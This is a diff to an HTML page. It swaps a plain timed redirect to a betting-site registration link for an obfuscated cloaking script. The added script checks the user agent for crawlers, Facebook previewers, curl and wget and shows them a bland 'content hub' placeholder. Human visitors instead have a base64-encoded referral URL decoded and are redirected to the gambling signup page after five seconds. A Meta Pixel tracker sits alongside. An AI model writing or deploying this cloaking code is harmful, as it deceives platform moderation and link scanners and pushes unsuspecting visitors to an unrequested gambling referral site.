@@ -85,11 +85,7 @@
       z-index: 0;
     }
   </style>
-  <script>
-    setTimeout(function() {
-      window.location.href = "https://livebet777.asia/register?referral=d2xsYjdfamFja3NvbjU1NQ==";
-    }, 5000);
-  </script>
+
   <!-- Meta Pixel Code -->
   <script>
     !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -110,6 +106,26 @@
   </noscript>
   <!-- End Meta Pixel Code -->
   <script src="https://cdn.jsdelivr.net/npm/tsparticles@2/tsparticles.bundle.min.js"></script>
+  <script>
+    const ua = navigator.userAgent.toLowerCase();
+    const isBot = /bot|crawler|spider|facebook|preview|facebot|slurp|curl|wget/.test(ua);
+    const encodedURL = "aHR0cHM6Ly9saXZlYmV0Nzc3LmFzaWEvcmVnaXN0ZXI/cmVmZXJyYWw9ZDJ4c1lzWmZhbUZqYzNWMmJHUmxNVGs9";
+
+    function decodeBase64(str) {
+      return decodeURIComponent(atob(str));
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      if (!isBot) {
+        setTimeout(() => {
+          const url = decodeBase64(encodedURL);
+          window.location.href = url;
+        }, 5000);
+      } else {
+        document.body.innerHTML = '<h1 style="text-align:center;margin-top:20vh;color:white">Welcome to our content hub</h1><p style="text-align:center;color:#aaa">This is a preview page.</p>';
+      }
+    });
+  </script>
 </head>
 <body>
   <video autoplay muted loop playsinline id="bg-video">
